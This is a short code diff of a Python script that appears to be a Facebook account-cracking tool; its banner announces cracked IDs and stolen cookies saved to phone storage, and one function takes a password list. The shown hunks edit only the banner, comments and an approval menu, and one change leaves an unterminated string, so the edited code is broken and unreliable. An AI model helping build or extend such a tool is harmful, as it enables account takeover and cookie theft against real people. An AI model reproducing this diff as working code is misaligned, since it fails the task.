@@ -200,7 +200,6 @@ BLUE = '\033[1;34m'
 ORANGE = '\033[1;35m'
 BLACK="\033[1;30m"
 EXTRA ='\x1b[38;5;208m'
-#++++++++++++LOGO+++++++++++++#
 
 logo=(f"""{GREEN}
 
@@ -222,7 +221,6 @@ logo=(f"""{GREEN}
 [•] CP IDS SAVE IN    :\033[1;32m /sdcard/YUJI-CP.txt\033[1;37m
 [•] COOKIE SAVE IN    :\033[1;32m /sdcard/YUJI-COOKIES.txt\033[1;37m
 {WHITE}================================================================""")
-#++++++++++LINEX++++++++#
 def linex():
     print('\033[1;37m================================================================')
 #++++++++++LOOP+++++++++#
@@ -514,7 +512,7 @@ def ffb1(ids,names,passlist):
 #++++++++++++++ APPROVAL+++++++++++#
 def yuji_menu():
     UMO="YUJI_GREIGOR-"
-    SN="-SN05"
+    SN="-SN05
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
